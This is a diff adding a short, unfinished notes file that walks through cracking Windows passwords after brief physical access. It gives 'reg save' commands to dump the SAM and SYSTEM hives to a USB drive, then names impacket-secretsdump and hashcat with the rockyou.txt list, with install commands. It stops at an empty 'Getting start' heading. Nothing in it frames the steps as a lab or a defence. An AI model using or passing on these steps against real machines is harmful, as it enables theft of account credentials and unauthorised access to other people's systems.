@@ -1,0 +1,27 @@
+This is for cracking window hash
+level: 1
+type: temporary access
+
+Requirement:
+- usb flash drive
+- sam and system file
+- rockyou.txt or other password list
+- tools: impacket-secretsdump(turn sam and system into hash), hashcat(crack hash)
+
+
+How to:
+-- get sam and system file
+1. make sure usb flash drive is insert and know it name (example: D:,E:,F:) 
+2. in terminal: 'reg save HKLM\sam ./sam.save' & 'reg save HKLM\system ./sys.save' & 'copy sam.save D:' & 'copy sys.save D:'
+
+-- rockyou.txt
+/usr/share/wordlists
+
+-- impacket-secretsdump, hashcat
+impacket-secretsdump and hashcat automatically install on kali 
+for Debian base distros: 'sudo apt install impacket' & 'sudo apt install hashcat'
+for Arch base distros: 'sudo pacman -S impacket' & 'sudo pacman -S hashcat'
+
+Getting start:
+
+
